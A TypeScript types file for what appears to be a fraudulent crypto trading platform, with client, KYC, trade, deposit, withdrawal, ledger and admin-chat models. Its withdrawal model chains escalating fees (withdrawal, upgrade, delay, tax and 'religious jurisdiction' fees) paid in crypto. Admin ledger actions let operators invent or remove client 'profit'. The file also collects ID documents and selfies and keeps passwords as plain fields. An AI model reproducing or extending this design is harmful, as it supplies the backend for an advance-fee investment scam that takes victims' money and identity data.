export type UserRole = 'client' | 'admin';

export type KycStatus = 'unverified' | 'pending' | 'verified' | 'rejected';

export interface KycSubmission {
  documentType: 'passport' | 'national_id' | 'drivers_license';
  documentNumber: string;
  country: string;
  frontImage: string;
  backImage?: string;
  selfieImage: string;
  submittedAt: string;
  reviewNotes?: string;
  reviewedAt?: string;
}

export interface ClientSessionInfo {
  browser: string; // Chrome, Safari, Opera Mini, Edge, Firefox
  os: string; // Windows, macOS, iOS, Android, Linux
  ip: string;
  device: string; // Desktop, Mobile, Tablet
  loginMethod: 'Email & Password' | 'OAuth Google' | 'OAuth Apple' | 'OAuth Facebook';
  lastActive: string;
  registeredAt: string;
}

export interface WithdrawalClearanceState {
  withdrawalFeePaid: boolean;
  withdrawalFeeAmount?: number;
  withdrawalFeePaidAt?: string;

  accountUpgraded: boolean;
  accountTier?: string;
  accountUpgradedAt?: string;
  upgradeFeeAmount?: number;

  delayFeePaid: boolean;
  delayFeeAmount?: number;
  delayFeePaidAt?: string;

  taxFeePaid: boolean;
  taxFeeAmount?: number;
  taxFeePaidAt?: string;

  religiousJurisdictionApproved: boolean;
  religiousJurisdictionApprovedAt?: string;
  jurisdictionFeeAmount?: number;

  // Real-time fee payment verification
  pendingPaymentStage?: number;
  pendingPaymentCrypto?: string;
  pendingPaymentTxid?: string;
  pendingPaymentAmount?: number;
  pendingPaymentSubmittedAt?: string;
}

export interface ClientUser {
  id: string;
  name: string;
  email: string;
  password: string;
  phone: string;
  country: string;
  currency: string; // USD, EUR, GBP, JPY, etc.
  language: string; // en, es, fr, de, etc.
  balance: number;
  totalProfit: number;
  totalDeposited: number;
  totalWithdrawn: number;
  bonus: number;
  kycStatus: KycStatus;
  kycData?: KycSubmission;
  sessionInfo: ClientSessionInfo;
  accountTier?: string;
  isSuspended: boolean;
  notes?: string;
  withdrawalClearance?: WithdrawalClearanceState;
}

export interface TradeOrder {
  id: string;
  userId: string;
  symbol: string;
  type: 'BUY' | 'SELL';
  orderType: 'MARKET' | 'LIMIT';
  amount: number;
  leverage: number;
  entryPrice: number;
  currentPrice: number;
  stopLoss?: number;
  takeProfit?: number;
  pnl: number;
  pnlPercent: number;
  status: 'OPEN' | 'CLOSED';
  openedAt: string;
  closedAt?: string;
}

export interface WithdrawalRecord {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  method: 'crypto' | 'bank' | 'paypal';
  asset: string; // USDT, BTC, ETH, SOL, USD, EUR, GBP, etc.
  network?: string;
  destinationAddress?: string;
  // Bank details
  bankName?: string;
  accountHolder?: string;
  accountNumber?: string;
  iban?: string;
  swiftCode?: string;
  routingNumber?: string;
  // PayPal details
  paypalEmail?: string;
  amount: number;
  fee: number;
  status: 'PENDING' | 'PROCESSING' | 'COMPLETED' | 'REJECTED';
  requestedAt: string;
  processedAt?: string;
  txHash?: string;
  rejectionReason?: string;
}

export interface DepositRecord {
  id: string;
  userId: string;
  userName: string;
  userEmail: string;
  asset: 'BTC' | 'ETH' | 'USDT' | 'SOL' | 'USD' | string;
  network: string;
  amount: number;
  txHash?: string;
  proofNote?: string;
  status: 'PENDING' | 'CONFIRMED' | 'REJECTED';
  createdAt: string;
  confirmedAt?: string;
}

export interface LedgerAuditRecord {
  id: string;
  userId: string;
  userName: string;
  adminEmail: string;
  action: 'ADD_PROFIT' | 'DEDUCT_PROFIT' | 'ADD_BALANCE' | 'DEDUCT_BALANCE' | 'ADD_DEPOSIT' | 'BONUS_CREDIT';
  amount: number;
  previousProfit: number;
  newProfit: number;
  previousBalance: number;
  newBalance: number;
  reason: string;
  timestamp: string;
}

export interface BoltChatMessage {
  id: string;
  userId: string;
  userName: string;
  sender: 'client' | 'admin';
  message: string;
  timestamp: string;
  read: boolean;
}

export interface AdminSettingsConfig {
  adminEmail: string;
  adminPassword: string;
  twoFactorEnabled: boolean;
  twoFactorSecret: string;
  walletAddresses: {
    BTC: { address: string; network: string; minDeposit: number };
    ETH: { address: string; network: string; minDeposit: number };
    USDT: { address: string; network: string; minDeposit: number };
    SOL: { address: string; network: string; minDeposit: number };
  };
  supportEmail: string;
  platformName: string;
}

export interface MarketAsset {
  symbol: string;
  baseAsset: string;
  quoteAsset: string;
  name: string;
  price: number;
  previousPrice: number;
  change24h: number;
  high24h: number;
  low24h: number;
  volume24h: number;
  trend: 'up' | 'down' | 'flat';
  history: number[];
}

export interface SystemNotification {
  id: string;
  title: string;
  message: string;
  type: 'profit' | 'trade' | 'withdrawal' | 'deposit' | 'kyc' | 'chat' | 'security';
  timestamp: string;
  read: boolean;
  userId?: string;
}
